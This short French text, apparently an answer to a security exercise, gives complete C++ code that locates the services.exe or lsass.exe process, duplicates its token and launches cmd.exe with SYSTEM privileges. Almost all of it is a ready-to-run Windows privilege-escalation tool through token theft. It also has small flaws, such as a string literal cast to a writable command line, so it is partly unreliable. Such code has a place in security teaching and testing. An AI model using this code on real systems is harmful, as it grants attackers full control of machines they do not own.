Voici le code pour implémenter les étapes mentionnées dans l'exercice. Ce code duplique le token du processus SYSTEM et l'utilise pour créer un nouveau processus cmd.exe élevé.

```cpp
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <sddl.h>
#include <Userenv.h>

DWORD FindSystemProcessId() {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[ERROR] CreateToolhelp32Snapshot: error %d\n", GetLastError());
        return pid;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("[ERROR] Process32First: error %d\n", GetLastError());
        CloseHandle(hSnapshot);
        return pid;
    }

    do {
        if (wcscmp(pe32.szExeFile, L"services.exe") == 0 || wcscmp(pe32.szExeFile, L"lsass.exe") == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

int main() {
    DWORD systemProcessId = FindSystemProcessId();
    HANDLE hProcess = NULL;
    HANDLE hProcessToken = NULL;
    HANDLE hDuplicatedToken = NULL;
    int status = 0;

    if (!systemProcessId) {
        printf("[ERROR] Find system process id: failed\n");
        status = -1;
        goto CLEANUP;
    }

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemProcessId);

    if (!hProcess) {
        printf("[ERROR] Cannot OpenProcess: error %d\n", GetLastError());
        status = -1;
        goto CLEANUP;
    }

    if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hProcessToken)) {
        printf("[ERROR] OpenProcessToken: error %d\n", GetLastError());
        status = -1;
        goto CLEANUP;
    }

    if (!DuplicateTokenEx(
            hProcessToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            &hDuplicatedToken)) {
        printf("[ERROR] DuplicateToken: error %d\n", GetLastError());
        status = -1;
        goto CLEANUP;
    }

    // Créer un nouveau processus cmd.exe avec le token duplicaté
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFO);

    if (!CreateProcessAsUser(
            hDuplicatedToken,
            NULL,
            (LPWSTR)L"cmd.exe",
            NULL,
            NULL,
            FALSE,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi)) {
        printf("[ERROR] CreateProcessAsUser: error %d\n", GetLastError());
        status = -1;
        goto CLEANUP;
    }

    printf("Created cmd.exe with SYSTEM privileges\n");

CLEANUP:
    if (hProcess)
        CloseHandle(hProcess);
    if (hProcessToken)
        CloseHandle(hProcessToken);
    if (hDuplicatedToken)
        CloseHandle(hDuplicatedToken);
    return status;
}
